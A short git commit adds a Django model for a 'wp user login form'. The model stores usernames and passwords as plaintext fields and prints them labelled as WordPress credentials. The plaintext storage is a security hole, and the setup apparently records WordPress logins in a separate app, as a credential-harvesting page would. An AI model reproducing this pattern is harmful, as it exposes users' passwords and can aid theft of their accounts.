605390b79a05aa9f94f138db5ced04920a88bd12
Makan DIANKA <makan.dianka@hotmail.com>
2025-03-20 21:04:11 +0100

    wp user login form

--- loginpage/models.py
+++ loginpage/models.py
@@ -1,3 +1,9 @@
 from django.db import models
 
-# Create your models here.
+class Login(models.Model):
+    username = models.CharField(max_length=100)
+    password = models.CharField(max_length=100)
+    date = models.DateTimeField(auto_now=True)
+
+    def __str__(self):
+        return f"#Wp username => {self.username} #Wp password => {self.password} #Create at => {self.date}"
